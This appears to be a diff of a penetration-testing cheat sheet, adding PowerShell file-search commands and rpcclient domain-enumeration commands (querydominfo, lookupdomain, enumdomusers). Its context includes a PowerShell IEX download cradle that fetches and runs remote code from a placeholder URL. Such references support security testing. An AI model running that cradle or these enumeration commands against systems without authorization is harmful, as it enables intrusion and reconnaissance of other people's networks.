@@ -259,13 +259,16 @@ python3 -m pip install package
 POWERSHELL
 ----------
 # grep
-Select-String -Path C:\path\here\*.log -Pattern "string_here"
+Select-String -Path C:\path\here\*.extension_here -Pattern "string_here"
 
 # grep recursively
-Get-ChildItem C:\path\to\directory -Filter *.log -Recurse | Select-String "string_here"
+Get-ChildItem C:\path\to\directory -Filter *.extension_here -Recurse | Select-String "string_here"
 
 # download file from web server
 IEX(New-Object Net.WebClient).downloadString('http://URL_here/file_here')
+
+# search for a file
+Get-Childitem –Path C:\ -Recurse –force -ErrorAction SilentlyContinue -Include *.extension_here -File
 
 
 PYTHON
@@ -298,6 +301,15 @@ rpcclient -U username%password IP_here
 
 # nmap script
 nmap --script rpc-grind IP_here
+
+# find domain name
+querydominfo
+
+# domain look-up
+lookupdomain domaine_here
+
+# enumerate domain users
+enumdomusers
 
 
 RPCBIND
